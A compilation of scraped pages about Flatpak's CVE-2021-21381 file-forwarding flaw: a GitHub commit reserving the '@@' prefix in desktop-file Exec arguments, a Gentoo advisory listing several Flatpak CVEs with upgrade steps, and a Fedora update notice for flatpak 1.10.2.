=== Content from github.com_185719ff_20250114_175906.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2Feb7946bb6248923d8c90fe9b84425fef97ae580d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2Feb7946bb6248923d8c90fe9b84425fef97ae580d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak)
* [Issues
  972](/flatpak/flatpak/issues)
* [Pull requests
  76](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

## Commit

[Permalink](/flatpak/flatpak/commit/eb7946bb6248923d8c90fe9b84425fef97ae580d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

dir: Reserve the whole @@ prefix

[Browse files](/flatpak/flatpak/tree/eb7946bb6248923d8c90fe9b84425fef97ae580d)
Browse the repository at this point in the history

```
If we add new features analogous to file forwarding later, we might
find that we need a different magic token. Let's reserve the whole
@@* namespace so we can call it @[@something-else](https://github.com/something-else).

Signed-off-by: Simon McVittie <smcv@collabora.com>
(cherry picked from commit [1e7e8fd](https://github.com/flatpak/flatpak/commit/1e7e8fdb24b51078f4c48e0711e24a14930ba1f0))
```

* Loading branch information

[![@smcv](https://avatars.githubusercontent.com/u/1561141?s=40&v=4)](/smcv) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)

[smcv](/flatpak/flatpak/commits?author=smcv "View all commits by smcv")
authored and
[alexlarsson](/flatpak/flatpak/commits?author=alexlarsson "View all commits by alexlarsson")
committed
Mar 10, 2021

1 parent
[8279c58](/flatpak/flatpak/commit/8279c5818425b6812523e3805bbe242fb6a5d961)

commit eb7946b

Showing
**1 changed file**
with
**1 addition**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[common/flatpak-dir.c](#diff-d9bbbd38e2a88a01804605a2d35dc54e31a761255be1fd7631f411778d1060a3 "common/flatpak-dir.c")

Show comments

[View file](/flatpak/flatpak/blob/eb7946bb6248923d8c90fe9b84425fef97ae580d/common/flatpak-dir.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7139,7 +7139,7 @@ export\_desktop\_file (const char \*app, |
|  |  | g\_string\_append\_printf (new\_exec, " @@ %s @@", arg); |
|  |  | else if (strcasecmp (arg, "%u") == 0) |
|  |  | g\_string\_append\_printf (new\_exec, " @@u %s @@", arg); |
|  |  | else if (strcmp (arg, "@@") == 0 || strcmp (arg, "@@u") == 0) |
|  |  | else if (g\_str\_has\_prefix (arg, "@@")) |
|  |  | g\_print (\_("Skipping invalid Exec argument %s\n"), arg); |
|  |  | else |
|  |  | g\_string\_append\_printf (new\_exec, " %s", arg); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `eb7946b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2Feb7946bb6248923d8c90fe9b84425fef97ae580d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.gentoo.org_df7d3f67_20250114_175911.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Flatpak: Multiple Vulnerabilities — GLSA **202312-12**

Several vulnerabilities have been found in Flatpack, the worst of which lead to privilege escalation and sandbox escape.

### Affected packages

| Package | **sys-apps/flatpak** on all architectures |
| --- | --- |
| Affected versions | < **1.14.4** |
| Unaffected versions | >= **1.14.4** |

### Background

Flatpak is a Linux application sandboxing and distribution framework.

### Description

Multiple vulnerabilities have been discovered in Flatpak. Please review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All Flatpak users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/flatpak-1.14.4"

```
### References

* [CVE-2021-21381](https://nvd.nist.gov/vuln/detail/CVE-2021-21381)
* [CVE-2021-41133](https://nvd.nist.gov/vuln/detail/CVE-2021-41133)
* [CVE-2021-43860](https://nvd.nist.gov/vuln/detail/CVE-2021-43860)
* [CVE-2022-21682](https://nvd.nist.gov/vuln/detail/CVE-2022-21682)
* [CVE-2023-28100](https://nvd.nist.gov/vuln/detail/CVE-2023-28100)
* [CVE-2023-28101](https://nvd.nist.gov/vuln/detail/CVE-2023-28101)
* GHSA-67h7-w3jq-vh4q
* GHSA-xgh4-387p-hqpp

**Release date**

December 23, 2023

**Latest revision**

December 23, 2023: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [775365](https://bugs.gentoo.org/show_bug.cgi?id=775365)
* [816951](https://bugs.gentoo.org/show_bug.cgi?id=816951)
* [831087](https://bugs.gentoo.org/show_bug.cgi?id=831087)
* [901507](https://bugs.gentoo.org/show_bug.cgi?id=901507)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from lists.fedoraproject.org_edd573f5_20250114_175911.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA.mbox.gz?message=2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA/#2MXXLXC2DPJ45HSMTI5MZYHMYEGQN6AA)

# [SECURITY] Fedora 34 Update: flatpak-1.10.2-1.fc34

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

19 Mar
2021

19 Mar
'21

8:31 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2021-fe7decc595
2021-03-19 19:51:22.367152
--------------------------------------------------------------------------------

Name : flatpak
Product : Fedora 34
Version : 1.10.2
Release : 1.fc34
URL : <http://flatpak.org/>
Summary : Application deployment framework for desktop apps
Description :
flatpak is a system for building, distributing and running sandboxed desktop
applications on Linux. See <https://wiki.gnome.org/Projects/SandboxedApps> for
more information.

--------------------------------------------------------------------------------
Update Information:

flatpak 1.10.2 release. This is a security update which fixes a potential
attack where a flatpak application could use custom formated .desktop files to
gain access to files on the host system. Other changes: \* Fix memory leaks \*
Some test fixes \* Documentation updates \* G\_BEGIN/END\_DECLS added to library
headders for c++ use \* Fix for X11 cookies on OpenSUSE \* Spawn portal better
handles non-utf8 filenames
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Mar 10 2021 Kalev Lember klember@redhat.com - 1.10.2-1
- Update to 1.10.2
\* Tue Mar 2 2021 Zbigniew J��drzejewski-Szmek zbyszek@in.waw.pl - 1.10.1-4
- Rebuilt for updated systemd-rpm-macros
See <https://pagure.io/fesco/issue/2583>.
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1936985 - CVE-2021-21381 flatpak: the "file forwarding" feature can be used to gain unprivileged access to files
<https://bugzilla.redhat.com/show_bug.cgi?id=1936985>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2021-fe7decc595' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
